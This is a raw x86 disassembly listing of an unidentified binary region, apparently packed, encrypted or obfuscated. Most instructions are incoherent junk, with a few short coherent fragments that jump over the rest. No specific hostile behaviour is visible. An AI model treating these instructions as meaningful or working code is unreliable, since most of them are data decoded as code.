  405b6f:	adc    al,0xb
  405b71:	into   
  405b72:	iret   
  405b73:	mov    cl,0xa9
  405b75:	pushf  
  405b76:	(bad)  
  405b77:	and    ah,BYTE PTR [ecx-0x66]
  405b7a:	xchg   esi,eax
  405b7b:	xor    ecx,DWORD PTR ds:0xe4faead7
  405b81:	fcom   DWORD PTR [edi+edi*2+0x419bc521]
  405b88:	fisttp WORD PTR [ebx-0x39cc13bb]
  405b8e:	add    eax,edi
  405b90:	push   eax
  405b91:	mov    eax,DWORD PTR [ebp-0x10]
  405b94:	add    eax,0xaa
  405b99:	push   eax
  405b9a:	jmp    0x405d92
  405b9f:	jne    0x405bbe
  405ba1:	adc    eax,0x71b155b1
  405ba6:	fld    DWORD PTR [edi+0x3f]
  405ba9:	mov    dh,0xdb
  405bab:	and    al,0x8a
  405bad:	jmp    0x557e:0x7e29603d
  405bb4:	jg     0x405c34
  405bb6:	jle    0x405bb3
  405bb8:	shr    DWORD PTR [edx],0xf9
  405bbb:	daa    
  405bbc:	aam    0x79
  405bbe:	sub    DWORD PTR [esi-0x9dc63e8],edx
  405bc4:	adc    DWORD PTR [ebx],ecx
  405bc6:	dec    esp
  405bc7:	test   BYTE PTR [esi+edx*8],al
  405bca:	int3   
  405bcb:	jne    0x405c09
  405bcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bce:	ds pop ds
  405bd0:	push   eax
  405bd1:	icebp  
  405bd2:	je     0x405c02
  405bd4:	pop    edx
  405bd5:	dec    esp
  405bd6:	add    DWORD PTR [ebx-0x7f],esi
  405bd9:	mov    ebp,0x1335ced4
  405bde:	jno    0x405bfc
  405be0:	jmp    0x398a:0xf65313ea
  405be7:	mov    ebp,0xd30df39
  405bec:	bound  ecx,QWORD PTR [esi]
  405bee:	call   0x384eb0db
  405bf3:	rcl    DWORD PTR [eax-0x3d],1
  405bf6:	shl    ch,1
  405bf8:	fist   DWORD PTR [esi]
  405bfa:	pop    esi
  405bfb:	and    DWORD PTR [ecx+eiz*8],esp
  405bfe:	lods   al,BYTE PTR ds:[esi]
  405bff:	aaa    
  405c00:	mov    cl,cl
  405c02:	stc    
  405c03:	cmp    BYTE PTR [edi+0x47428e48],dl
  405c09:	xlat   BYTE PTR ds:[ebx]
  405c0a:	pop    ecx
  405c0b:	rcr    BYTE PTR [edi-0x549c9d00],0xbf
  405c12:	loopne 0x405c61
  405c14:	xchg   ebp,eax
  405c15:	sar    ebx,cl
  405c17:	pop    gs
  405c19:	adc    eax,0x328fdae2
  405c1e:	push   ebp
  405c1f:	xor    bl,bl
  405c21:	sbb    al,0xc3
  405c23:	jmp    0x55126bac
  405c28:	mov    ecx,0x9faba890
  405c2d:	inc    eax
  405c2e:	mov    al,0x61
  405c30:	cmp    ah,BYTE PTR [edx]
  405c32:	push   ss
  405c33:	test   esi,0x383180b7
  405c39:	shr    DWORD PTR [esi+0x3d],0xf2
  405c3d:	stos   DWORD PTR es:[edi],eax
  405c3e:	lahf   
  405c3f:	clc    
  405c40:	sti    
  405c41:	or     ebx,DWORD PTR [ecx-0x69]
  405c44:	enter  0x3a39,0xf6
  405c48:	xchg   ebp,eax
  405c49:	inc    esi
  405c4a:	(bad)  
  405c4b:	push   ecx
  405c4c:	add    al,BYTE PTR [edi+0x51]
  405c4f:	mov    eax,esi
  405c51:	fucomp st(7)
  405c53:	mov    eax,0x1b53eae8
  405c58:	push   ebp
  405c59:	scas   eax,DWORD PTR es:[edi]
  405c5a:	inc    esi
  405c5b:	jle    0x405c9e
  405c5d:	ja     0x405cc3
  405c5f:	adc    bl,0x37
  405c62:	ins    DWORD PTR es:[edi],dx
  405c63:	pop    ds
  405c64:	fistp  QWORD PTR [edx-0x2296a6f5]
  405c6a:	test   BYTE PTR [edx+0x2b],ch
  405c6d:	add    dl,BYTE PTR [ebp-0x3f]
  405c70:	into   
  405c71:	leave  
  405c72:	int    0xab
  405c74:	mov    ecx,0x792f238d
  405c79:	jb     0x405c05
  405c7b:	aam    0xd7
  405c7d:	or     eax,esi
  405c7f:	cwde   
  405c80:	ds or  al,0x60
  405c83:	sbb    DWORD PTR [esi-0x6d],edx
  405c86:	test   BYTE PTR [ebx-0xb],cl
  405c89:	sub    ecx,ebp
  405c8b:	dec    esi
  405c8c:	test   eax,0x69438988
  405c91:	xchg   ecx,eax
  405c92:	clc    
  405c93:	(bad)  
  405c95:	push   0x1598207d
  405c9a:	push   ebp
  405c9b:	sti    
  405c9c:	mov    ds:0x99ea82fe,al
  405ca1:	gs aad 0x5
  405ca4:	push   ds
  405ca5:	sub    al,0xd7
  405ca7:	ret    0xcb6b
  405caa:	mov    BYTE PTR [ecx+0x2d849fa4],0x3f
  405cb1:	cdq    
  405cb2:	and    BYTE PTR [eax-0x9],al
  405cb5:	arpl   dx,dx
  405cb7:	cmp    BYTE PTR [ecx],0xaf
  405cba:	sub    ebp,edi
  405cbc:	(bad)  
  405cbd:	fadd   DWORD PTR cs:[eax]
  405cc0:	rcr    BYTE PTR [ecx-0x4d],1
  405cc3:	icebp  
  405cc4:	stc    
  405cc5:	jle    0x405ca1
  405cc7:	add    BYTE PTR cs:[esi],ah
  405cca:	lahf   
  405ccb:	cmp    al,BYTE PTR [ebx-0x32f6a926]
  405cd1:	fdivr  DWORD PTR [eax+edx*8-0x209e502a]
  405cd8:	adc    dh,BYTE PTR [ebx+0x2b]
  405cdb:	ret    
  405cdc:	hlt    
  405cdd:	dec    esi
  405cde:	mov    esi,0x6699f034
  405ce3:	mov    ah,ch
  405ce5:	jl     0x405d03
  405ce7:	and    eax,0x7a75a0cc
  405cec:	stos   DWORD PTR es:[edi],eax
  405ced:	xor    dl,bl
  405cef:	nop
  405cf0:	push   esp
  405cf1:	imul   edx,esp,0x64
  405cf4:	xor    edx,DWORD PTR [eax+ebp*2-0x140fec3a]
  405cfb:	xor    al,cl
  405cfd:	rol    BYTE PTR [ebp-0x44],1
  405d00:	imul   ebp,edx,0x5d
  405d03:	test   eax,0x8b1652d9
  405d08:	sub    edx,DWORD PTR [ebp-0x72]
  405d0b:	adc    dl,dl
  405d0d:	push   cs
  405d0e:	out    dx,al
  405d0f:	mov    bl,0xd
  405d11:	arpl   WORD PTR gs:[ecx+0x6b],bx
  405d15:	xor    DWORD PTR [ebx+esi*8+0x60ee1c8f],esp
  405d1c:	pusha  
  405d1d:	jmp    0x405cb4
  405d1f:	mov    ebp,0xefc850c5
  405d24:	and    ecx,DWORD PTR [ecx-0x1f]
  405d27:	ins    BYTE PTR es:[edi],dx
  405d28:	cmp    ah,ch
  405d2a:	push   ecx
  405d2b:	cmp    al,BYTE PTR [ebp+0x5c4e08a6]
  405d31:	int    0x1f
  405d33:	push   0xffffff9c
  405d35:	out    dx,eax
  405d36:	dec    edi
  405d37:	pop    ss
  405d38:	dec    esi
  405d39:	xor    eax,DWORD PTR [ecx+eiz*4]
  405d3c:	in     eax,dx
  405d3d:	lahf   
  405d3e:	out    0x4,eax
  405d40:	fnstcw WORD PTR [bx+di]
  405d43:	sbb    DWORD PTR [ebx-0x13],0x2653c055
  405d4a:	icebp  
  405d4b:	jo     0x405d4a
  405d4d:	jmp    DWORD PTR [edi+0x45d23f8a]
  405d53:	inc    ecx
  405d54:	sbb    DWORD PTR [ecx],esi
  405d56:	xor    al,0x11
  405d58:	xchg   ebx,eax
  405d59:	int    0xbf
  405d5b:	mov    eax,ds:0x8efb8740
  405d60:	inc    edi
  405d61:	outs   dx,BYTE PTR ds:[esi]
  405d62:	das    
  405d63:	add    eax,0x26a35405
  405d68:	jl     0x405d6d
  405d6a:	inc    esp
  405d6b:	pushf  
  405d6c:	sti    
  405d6d:	retf   0x5379
  405d70:	or     edi,ecx
  405d72:	sub    eax,0x18d88ad1
  405d77:	fdivr  st,st(4)
  405d79:	dec    edx
  405d7a:	int    0x41
  405d7c:	retf   0x2995
  405d7f:	daa    
  405d80:	loopne 0x405dff
  405d82:	mov    eax,0xbade85d5
  405d87:	dec    ebp
  405d88:	retf   0xb508
  405d8b:	mov    ch,BYTE PTR [ebp-0x170aa317]
  405d91:	fmul   QWORD PTR [ebx-0x7f740fbb]
  405d97:	cwde   
  405d98:	add    DWORD PTR [eax],eax
  405d9a:	add    bh,bh
  405d9c:	xor    al,ch
  405d9e:	and    esi,DWORD PTR [eax+0x0]
  405da1:	add    BYTE PTR [ecx+0x7d83f845],cl
  405da7:	clc    
  405da8:	add    BYTE PTR [ebp-0xc16fbbb],cl
  405dae:	add    DWORD PTR [eax],eax
  405db0:	add    BYTE PTR [ebx+0x518ed1c9],dl
  405db6:	xchg   esi,eax
  405db7:	push   ecx
  405db8:	shl    DWORD PTR [edx+0x3f9c135b],1
  405dbe:	rol    BYTE PTR [ebx+0x7e3747f5],0x7e
  405dc5:	push   ebp
  405dc6:	jg     0x405e46
  405dc8:	jle    0x405e48
  405dca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405dcb:	(bad)  
  405dcc:	loopne 0x405e28
  405dce:	pushf  
  405dcf:	push   esp
  405dd0:	outs   dx,BYTE PTR ds:[esi]
  405dd1:	imul   edi,DWORD PTR [eax],0xfffffff1
  405dd4:	or     bl,BYTE PTR [esi+0x6de95cca]
  405dda:	icebp  
  405ddb:	xor    DWORD PTR [ecx-0x44],ecx
  405dde:	lds    esp,FWORD PTR [esi+edi*8]
  405de1:	cmp    BYTE PTR [eax+0x2b],0x9
  405de5:	scas   eax,DWORD PTR es:[edi]
  405de6:	push   ss
  405de7:	pop    edi
  405de8:	push   eax
  405de9:	sar    cl,0x2f
  405dec:	stos   DWORD PTR es:[edi],eax
  405ded:	shr    DWORD PTR [ebx-0x1d],0x5a
  405df1:	jge    0x405e5e
  405df3:	add    BYTE PTR [ebp-0x18faae48],ch
  405df9:	fld    DWORD PTR [ecx]
  405dfb:	dec    edx
  405dfc:	ins    BYTE PTR es:[edi],dx
  405dfd:	mov    ebx,0xa0ce014d
  405e02:	dec    edi
  405e03:	lds    edi,FWORD PTR [ebp+0x7f]
  405e06:	in     al,0xeb
  405e08:	cdq    
  405e09:	rcl    BYTE PTR [esi+0x6377ebd9],1
  405e0f:	or     BYTE PTR [edx],dh
  405e11:	les    ebx,FWORD PTR [eax-0x51ffbe02]
  405e17:	inc    edx
  405e18:	xor    BYTE PTR [ebp+0x43],al
  405e1b:	(bad)  
  405e1c:	adc    ebp,DWORD PTR [edi+0x2c]
  405e1f:	xchg   edi,eax
  405e20:	out    dx,eax
  405e21:	add    eax,0x3c77decb
  405e26:	sbb    bh,BYTE PTR [esi-0x2c]
  405e29:	or     al,0x88
  405e2b:	or     ch,BYTE PTR [eax+0x2a]
  405e2e:	fbld   TBYTE PTR [ebp+0x5a3e7e7]
  405e34:	push   ecx
  405e35:	push   0xdee80150
  405e3a:	push   edx
  405e3b:	push   esp
  405e3c:	mov    ds:0x9cd828b4,al
  405e41:	push   ss
  405e42:	in     al,0x23
  405e44:	mov    BYTE PTR [ebx+0x4116b466],ch
  405e4a:	sub    DWORD PTR [ecx],esi
  405e4c:	outs   dx,DWORD PTR ds:[esi]
  405e4d:	push   ebx
  405e4e:	cdq    
  405e4f:	invd   
  405e51:	pop    ebx
  405e52:	out    dx,al
  405e53:	cmp    esi,ebx
  405e55:	div    DWORD PTR [eax-0x58]
  405e58:	jno    0x405e57
  405e5a:	xchg   DWORD PTR [ebp-0x4],ecx
  405e5d:	lock fisttp DWORD PTR [ebx+eiz*1]
  405e61:	int    0xc8
  405e63:	add    eax,0xc99d59e0
  405e68:	adc    ebp,edi
  405e6a:	mov    ecx,0x66058a85
  405e6f:	cmp    edx,esp
  405e71:	inc    eax
  405e72:	mov    WORD PTR [edx+0x5d],cs
  405e75:	push   0x32
  405e77:	ror    DWORD PTR [ebp-0x62d2bad0],1
  405e7d:	mov    ebx,0xc6567ffd
  405e82:	mov    al,0xec
  405e84:	sbb    BYTE PTR [ebx+ebx*4+0x53],cl
  405e88:	sbb    al,BYTE PTR [edi+0x3b]
  405e8b:	xchg   ecx,edi
  405e8d:	jle    0x405e71
  405e8f:	mov    ah,0x88
  405e91:	inc    ebp
  405e92:	mov    ds:0x43b26f91,al
  405e97:	jmp    0xb60a9cb8
  405e9c:	fdivr  DWORD PTR [edi]
  405e9e:	jb     0x405eac
  405ea0:	cmp    al,0x44
  405ea2:	aas    
  405ea3:	add    ebx,DWORD PTR [ebx+eiz*4+0x2b00ab6b]
  405eaa:	inc    ecx
  405eab:	xor    eax,DWORD PTR [eax+0x1b]
  405eae:	and    BYTE PTR [edi-0x22],ch
  405eb1:	dec    ebp
  405eb2:	rol    BYTE PTR [eax],0xdd
  405eb5:	loope  0x405f03
  405eb7:	arpl   bp,sp
  405eb9:	mov    esp,0x65f52d05
  405ebe:	cmp    cl,BYTE PTR [ebx+0x66e82116]
  405ec4:	je     0x405ee4
  405ec6:	and    dh,BYTE PTR [eax+0x20]
  405ec9:	or     eax,0x7bb4348f
  405ece:	jg     0x405e85
  405ed0:	mov    BYTE PTR [edx+0x56],dh
  405ed3:	cmp    ebx,DWORD PTR [edi]
  405ed5:	rcl    DWORD PTR [ecx-0x5b],0x2e
  405ed9:	das    
  405eda:	dec    esp
  405edb:	jge    0x405f37
  405edd:	pop    ss
  405ede:	shl    DWORD PTR [ecx+0x52],0x71
  405ee2:	out    0x87,al
  405ee4:	mov    esp,0x52219fa3
  405ee9:	add    cl,BYTE PTR [edx+0x11e36a2]
  405eef:	push   eax
  405ef0:	mov    ds:0x9320650b,eax
  405ef5:	lods   eax,DWORD PTR ds:[esi]
  405ef6:	lahf   
  405ef7:	ror    BYTE PTR [ecx+0x49],0xa2
  405efb:	jae    0x405ee7
  405efd:	pop    ds
  405efe:	lods   eax,DWORD PTR ds:[esi]
  405eff:	sbb    DWORD PTR [edx-0x3f],0x542f3e7c
  405f06:	sbb    DWORD PTR [edi-0xa],edx
  405f09:	pop    edx
  405f0a:	mov    ah,0xf2
  405f0c:	(bad)  
  405f0d:	jle    0x405f4d
  405f0f:	sub    eax,0x560d759d
  405f14:	push   edi
  405f15:	fnsave [esi+0x2e]
  405f18:	aaa    
  405f19:	xchg   ebp,eax
  405f1a:	fcom   QWORD PTR [ebx]
  405f1c:	jle    0x405f3b
  405f1e:	mov    bl,0x2e
  405f20:	xchg   esi,eax
  405f21:	mov    eax,0x9464c5c6
  405f26:	out    0x93,al
  405f28:	outs   dx,DWORD PTR ds:[esi]
  405f29:	push   ds
  405f2a:	aad    0xbb
  405f2c:	mov    ss,eax
  405f2e:	xchg   edi,eax
  405f2f:	fdivr  DWORD PTR [ebx+0x3f8ec362]
  405f35:	(bad)  
  405f36:	adc    eax,0x2847fb3a
  405f3b:	jae    0x405fb1
  405f3d:	das    
  405f3e:	dec    ecx
  405f3f:	fwait
  405f40:	xchg   BYTE PTR [edx+esi*1+0x4a],dh
  405f44:	sub    eax,0x1e05c46e
  405f49:	push   edx
  405f4a:	push   0x46
  405f4c:	push   edi
  405f4d:	(bad)  
  405f4e:	sbb    BYTE PTR [esi],ch
  405f50:	inc    esi
  405f51:	adc    eax,0xc9b5113
  405f56:	dec    ebp
  405f57:	aas    
  405f58:	mov    ah,0xc5
  405f5a:	pop    ebp
  405f5b:	and    edx,DWORD PTR [ebp+edi*4+0x71]
  405f5f:	xchg   ebp,eax
  405f60:	lods   al,BYTE PTR ds:[esi]
  405f61:	cmc    
  405f62:	jb     0x405f75
  405f64:	clc    
  405f65:	xor    eax,0x61277ecc
  405f6a:	mov    bh,0x9d
  405f6c:	or     BYTE PTR [esi+0x5bd18712],bh
  405f72:	popa   
  405f73:	dec    ebp
  405f74:	mov    ch,0x7d
  405f76:	scas   al,BYTE PTR es:[edi]
  405f77:	mov    al,0xb
  405f79:	ficomp WORD PTR [esi+eiz*8-0x3d95af39]
  405f80:	imul   ecx,esp,0xfffffffc
  405f83:	comiss xmm2,DWORD PTR [ebx+edx*4]
  405f87:	xor    DWORD PTR [esi],eax
  405f89:	das    
  405f8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f8b:	sbb    edx,DWORD PTR [edx]
  405f8d:	mov    eax,ds:0xe46c195b
  405f92:	mov    bh,0xf6
  405f94:	mov    esp,0x23dd3d3c
  405f99:	repz mov dh,0xd7
  405f9c:	call   0xcd0b:0x4b2615a0
  405fa3:	pop    ebp
  405fa4:	mov    DWORD PTR [ebp-0x20],eax
  405fa7:	je     0x406a43
  405fad:	jmp    0x4061a5
  405fb2:	jmp    0x405fa8
  405fb4:	pushf  
  405fb5:	dec    esi
  405fb6:	mov    eax,ds:0x9371e956
  405fbb:	inc    ebx
  405fbc:	and    dl,BYTE PTR [ecx+0x61]
  405fbf:	ja     0x405fd8
  405fc1:	fistp  DWORD PTR [edx+0x557e7e35]
  405fc7:	jg     0x406047
  405fc9:	jle    0x405fa8
  405fcb:	les    esp,FWORD PTR [ecx+0x11]
  405fce:	push   esp
  405fcf:	addr16 ret 0x2eed
  405fd3:	jg     0x40603f
  405fd5:	stos   BYTE PTR es:[edi],al
  405fd6:	int    0xd1
  405fd8:	and    ch,BYTE PTR [eax-0x55102971]
  405fde:	jmp    0xd31163ac
  405fe3:	outs   dx,DWORD PTR ds:[esi]
  405fe4:	outs   dx,DWORD PTR ds:[esi]
  405fe5:	into   
  405fe6:	mov    ds,esp
  405fe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fe9:	and    al,0xab
  405feb:	mov    edi,0x8be2de73
  405ff0:	lahf   
  405ff1:	cmpxchg BYTE PTR [edi],dh
  405ff4:	push   ecx
  405ff5:	mov    edi,0x56cb4fa2
  405ffa:	into   
  405ffb:	add    al,BYTE PTR [edx-0x99d8ff9]
  406001:	dec    esi
  406002:	mov    ds:0x7bafb332,eax
  406007:	push   0xe75faaa4
  40600c:	gs into 
  40600e:	xor    DWORD PTR [ecx+0x122954a4],ebx
  406014:	outs   dx,DWORD PTR ds:[esi]
  406015:	iret   
  406016:	out    0xe1,eax
  406018:	lea    esi,ds:0x35f80a61
  40601e:	push   cs
  40601f:	jmp    FWORD PTR [ebp-0x1d9c35e4]
  406025:	pop    ebx
  406026:	fadd   QWORD PTR [edx-0x53]
  406029:	cmp    BYTE PTR [ecx+eiz*8+0x7a],dl
  40602d:	aam    0x13
  40602f:	mov    edi,0x4655ad19
  406034:	out    0x68,eax
  406036:	cmp    DWORD PTR [edi+0x46],edi
  406039:	jp     0x405ffc
  40603b:	jnp    0x4060aa
  40603d:	test   al,0xdd
  40603f:	add    eax,0x70eed5cd
  406044:	popa   
  406045:	in     al,dx
  406046:	(bad)  
  406047:	ins    DWORD PTR es:[edi],dx
  406048:	xor    BYTE PTR [edx-0x1e],0x3b
  40604c:	shl    DWORD PTR [ebx],cl
  40604e:	mov    dh,0x75
  406050:	scas   eax,DWORD PTR es:[edi]
  406051:	mov    dl,0x84
  406053:	sub    eax,0x8a286986
  406058:	xor    BYTE PTR [esi-0x1a],bh
  40605b:	xor    ecx,DWORD PTR [edx-0x56d63eaa]
  406061:	retf   0xb6bd
  406064:	dec    esi
  406065:	push   es
  406066:	outs   dx,DWORD PTR ds:[esi]
  406067:	por    mm5,QWORD PTR ds:0x9a70d892
  40606e:	cwde   
  40606f:	sub    al,0x55
  406071:	pop    ds
  406072:	into   
  406073:	adc    al,0x68
  406075:	das    
  406076:	ret    
  406077:	mov    dh,0xa9
  406079:	adc    eax,0xaa82bf64
  40607e:	xchg   edx,eax
  40607f:	and    dh,BYTE PTR [ecx-0x5f]
  406082:	call   0x5b2001f2
  406087:	inc    ecx
  406088:	shl    DWORD PTR [edx-0x36673091],0x4f
  40608f:	js     0x4060b8
  406091:	sub    eax,0x9e78a17a
  406096:	mov    ebx,0x97e213be
  40609b:	jl     0x40602d
  40609d:	fbld   TBYTE PTR [esi+0x61ff30a6]
  4060a3:	loope  0x4060f2
  4060a5:	ret    0x1bd4
  4060a8:	call   0x9576:0xa48f1950
  4060af:	(bad)  
  4060b0:	xor    edi,esp
  4060b2:	jne    0x4060f6
  4060b4:	dec    edx
  4060b5:	jle    0x4060ec
  4060b7:	ins    BYTE PTR es:[edi],dx
  4060b8:	fnstenv [ebx]
  4060ba:	repz out dx,eax
  4060bc:	enter  0x8efe,0xb8
  4060c0:	retf   0xed4b
  4060c3:	mov    dh,0x5c
  4060c5:	mov    eax,0x2b13e387
  4060ca:	loope  0x4060d3
  4060cc:	hlt    
  4060cd:	dec    edx
  4060ce:	mov    ebp,0x9b95a8a8
  4060d3:	iret   
  4060d4:	fidiv  WORD PTR [eax-0x2360b236]
  4060da:	bound  eax,QWORD PTR [ecx+0x5ae34543]
  4060e0:	pop    edx
  4060e1:	inc    eax
  4060e2:	(bad)  
  4060e3:	mov    cl,0x3
  4060e5:	inc    edi
  4060e6:	cwde   
  4060e7:	ss pop edi
  4060e9:	and    ebx,DWORD PTR [edi+0x28]
  4060ec:	je     0x406167
  4060ee:	pop    ss
  4060ef:	fdiv   QWORD PTR [edi]
  4060f1:	stos   BYTE PTR es:[edi],al
  4060f2:	gs lahf 
  4060f4:	mov    cl,BYTE PTR [esi-0x6b]
  4060f7:	add    ch,BYTE PTR [edx]
  4060f9:	pusha  
  4060fa:	pop    ss
  4060fb:	stos   BYTE PTR es:[edi],al
  4060fc:	test   al,0x5b
  4060fe:	stos   DWORD PTR es:[edi],eax
  4060ff:	retf   
  406100:	adc    ch,bh
  406102:	add    BYTE PTR [ecx],al
  406104:	pop    ebp
  406105:	cmp    BYTE PTR [ebx],al
  406107:	aad    0x22
  406109:	push   ss
  40610a:	popf   
  40610b:	fs xchg ecx,eax
  40610d:	rcl    edx,0x4d
  406110:	jb     0x406119
  406112:	repz mov esp,0x1917dca2
  406118:	aam    0xc0
  40611a:	scas   eax,DWORD PTR es:[edi]
  40611b:	js     0x4060d4
  40611d:	sub    edi,esp
  40611f:	mov    dl,0x54
  406121:	icebp  
  406122:	hlt    
  406123:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406124:	sub    esp,DWORD PTR [ecx]
  406126:	call   0x98d7bf82
  40612b:	jb     0x406135
  40612d:	clc    
  40612e:	ret    
  40612f:	test   eax,0x2000e709
  406134:	imul   ebp,DWORD PTR [ebx+0xc841cc4],0x5b
  40613b:	add    ch,dh
  40613d:	xlat   BYTE PTR ds:[ebx]
  40613e:	sub    DWORD PTR [ebx+edi*8+0x54f735ec],ebp
  406145:	test   DWORD PTR [ebp+0x61888bba],0xfb54af7a
  40614f:	pushf  
  406150:	mov    edi,DWORD PTR [esi-0x79c8c23d]
  406156:	add    dh,0xc4
  406159:	in     al,0x95
  40615b:	push   0xffffffaa
  40615d:	retf   0x651e
  406160:	fstp   st(5)
  406162:	mov    eax,0x23c8746e
  406167:	add    al,0x3f
  406169:	pop    ecx
  40616a:	sbb    eax,0x42d1c6cd
  40616f:	xchg   DWORD PTR [ebp+0x66],esp
  406172:	ds jecxz 0x4061ac
  406175:	or     al,0xdb
  406177:	xor    al,BYTE PTR [ebx+0x59]
  40617a:	mov    bh,0xd5
  40617c:	sahf   
  40617d:	pop    edx
  40617e:	push   esi
  40617f:	sar    DWORD PTR [edi],1
  406181:	test   al,0xcd
  406183:	cmp    al,0xf2
  406185:	cs jns 0x40610a
  406188:	or     eax,ecx
  40618a:	cmp    al,al
  40618c:	jne    0x40611d
  40618e:	and    DWORD PTR [edi+ecx*4-0x6cb6facc],0x7a4b28d7
  406199:	aad    0xcb
  40619b:	push   es
  40619c:	cmp    bh,cl
  40619e:	nop
  40619f:	jp     0x4061c3
  4061a1:	in     eax,0x68
  4061a3:	cli    
  4061a4:	mov    esp,0x50e8458d
  4061a9:	mov    eax,DWORD PTR [ebp-0x2c]
  4061ac:	xor    eax,esi
  4061ae:	add    eax,edi
  4061b0:	push   eax
  4061b1:	mov    eax,DWORD PTR [ebp-0x1c]
  4061b4:	xor    eax,esi
  4061b6:	add    eax,edi
  4061b8:	push   eax
  4061b9:	push   DWORD PTR [ebp-0x8]
  4061bc:	lea    eax,[ebp-0x78]
  4061bf:	push   eax
  4061c0:	jmp    0x4063b8
  4061c5:	cmp    eax,0xb41aac57
  4061ca:	loope  0x406215
  4061cc:	jno    0x406181
  4061ce:	dec    edi
  4061cf:	add    dl,cl
  4061d1:	(bad)  
  4061d2:	mov    WORD PTR [edi],es
  4061d4:	shl    cl,0x33
  4061d7:	jle    0x406257
  4061d9:	push   ebp
  4061da:	jg     0x40625a
  4061dc:	jle    0x4061de
  4061de:	cmp    eax,0x38d7b53a
  4061e3:	and    DWORD PTR [edi-0x19],0x1c
  4061e7:	cld    
  4061e8:	cdq    
  4061e9:	sub    eax,0x65c93a2f
  4061ee:	xchg   edx,eax
  4061ef:	inc    eax
  4061f0:	pop    ebp
  4061f1:	repnz pop esi
  4061f3:	in     al,dx
  4061f4:	loope  0x406230
  4061f6:	and    BYTE PTR [edx+0x10b88e65],0x64
  4061fd:	and    DWORD PTR [edi],edi
  4061ff:	ror    esp,0xfe
  406202:	aaa    
  406203:	and    edi,ebp
  406205:	dec    DWORD PTR [edi-0x9249ebe]
  40620b:	push   esp
  40620c:	push   es
  40620d:	add    eax,0x17af0ebc
  406212:	cmp    al,0x36
  406214:	pop    es
  406215:	jb     0x406227
  406217:	or     esi,esp
  406219:	addr16 push eax
  40621b:	out    0xe9,eax
  40621d:	pop    ecx
  40621e:	fiadd  WORD PTR [edx+eax*4+0x60e97ea1]
  406225:	cli    
  406226:	push   edi
  406227:	sbb    al,0x19
  406229:	data16 sub al,0x61
  40622c:	pop    edi
  40622d:	leave  
  40622e:	mov    cl,0xe3
  406230:	fst    st(7)
  406232:	mov    cl,0xea
  406234:	xchg   esi,eax
  406235:	cli    
  406236:	push   ds
  406237:	rol    DWORD PTR [esi-0x60],1
  40623a:	(bad)  
  40623b:	mov    ebx,0x57c53d44
  406240:	or     BYTE PTR [esi],dl
  406242:	popa   
  406243:	inc    ecx
  406244:	(bad)  
  406245:	fild   QWORD PTR [esi+0x3e]
  406248:	inc    edi
  406249:	sbb    edi,esi
  40624b:	test   eax,0xe30b4a91
  406250:	stc    
  406251:	inc    ecx
  406252:	push   es
  406253:	xchg   ebp,eax
  406254:	jge    0x4062af
  406256:	aad    0x1a
  406258:	stc    
  406259:	ret    
  40625a:	fdivr  QWORD PTR [eax]
  40625c:	sub    esp,ecx
  40625e:	lock xor cl,BYTE PTR [edi+0x5d5cb574]
  406265:	cmp    DWORD PTR [ebx+0x7cbfa2f1],edx
  40626b:	mov    edi,0xb4fe860
  406270:	xlat   BYTE PTR ds:[ebx]
  406271:	int3   
  406272:	and    ah,BYTE PTR [ecx]
  406274:	or     eax,0xf1e56b0e
  406279:	push   esp
  40627a:	nop
  40627b:	rcl    DWORD PTR [ebp-0x27],1
  40627e:	xchg   BYTE PTR [edi],bh
  406280:	mov    al,ds:0x79285b24
  406285:	fbld   TBYTE PTR [edi-0x43]
  406288:	jl     0x406285
  40628a:	in     eax,dx
  40628b:	sub    cl,cl
  40628d:	push   ebp
  40628e:	xor    eax,0x3cdf69fd
  406293:	cli    
  406294:	jns    0x40629f
  406296:	dec    ebx
  406297:	mov    ds:0x746a20ad,al
  40629c:	pop    ecx
  40629d:	xchg   ebp,eax
  40629e:	xor    esp,0xffffff90
  4062a1:	(bad)  
  4062a2:	mov    ebx,0x84a64897
  4062a7:	inc    ebp
  4062a8:	mov    al,0xa2
  4062aa:	cmp    esp,edi
  4062ac:	and    al,0x62
  4062ae:	lds    esp,FWORD PTR [edi+0x45aaf041]
  4062b4:	in     al,dx
  4062b5:	test   al,0xbf
  4062b7:	dec    eax
  4062b8:	add    DWORD PTR [esi-0x40],ecx
  4062bb:	sbb    edi,DWORD PTR [edi+0x65]
  4062be:	scas   al,BYTE PTR es:[edi]
  4062bf:	cld    
  4062c0:	dec    eax
  4062c1:	in     eax,dx
  4062c2:	icebp  
  4062c3:	clc    
  4062c4:	lds    ebp,FWORD PTR [edx-0x61]
  4062c7:	dec    ebx
  4062c8:	jnp    0x4062cb
  4062ca:	aam    0x15
  4062cc:	and    BYTE PTR [edx+eax*4+0x1fa44b9],0x4d
  4062d4:	je     0x406353
  4062d6:	xchg   ecx,eax
  4062d7:	add    al,0x97
  4062d9:	mov    ecx,DWORD PTR ds:0x896220f6
  4062df:	div    bh
  4062e1:	xchg   ebx,eax
  4062e2:	push   esp
  4062e3:	push   edx
  4062e4:	mov    bh,0xb6
  4062e6:	pop    ebx
  4062e7:	fstp   QWORD PTR [ecx]
  4062e9:	test   al,0x7
  4062eb:	inc    esi
  4062ec:	cmc    
  4062ed:	neg    ebx
  4062ef:	push   ebp
  4062f0:	mov    bh,0x61
  4062f2:	out    dx,eax
  4062f3:	sbb    esi,esp
  4062f5:	adc    al,0x95
  4062f7:	sahf   
  4062f8:	dec    esp
  4062f9:	iret   
  4062fa:	mov    eax,ds:0x6a3f238
  4062ff:	ss dec edx
  406301:	ss pop ebp
  406303:	test   DWORD PTR [edi-0x2e],esp
  406306:	push   ds
  406307:	cmp    edi,esi
  406309:	push   ecx
  40630a:	sbb    BYTE PTR [ebx],dh
  40630c:	sub    eax,0x23b6f545
  406311:	push   esi
  406312:	dec    edi
  406313:	rcl    BYTE PTR [ebx+0x59b7ab62],1
  406319:	push   edx
  40631a:	out    dx,eax
  40631b:	pop    ebp
  40631c:	cld    
  40631d:	retf   
  40631e:	mov    edi,0x2444d50c
  406323:	or     BYTE PTR [esi+ebp*1+0x6b20feb1],ch
  40632a:	pop    edi
  40632b:	ror    DWORD PTR [edi+0x6a],0x88
  40632f:	sbb    ebp,edi
  406331:	jmp    0x406395
  406333:	adc    eax,0xb918c612
  406338:	jmp    0x406319
  40633a:	out    0x24,eax
  40633c:	popw   es
  40633e:	jno    0x4062d6
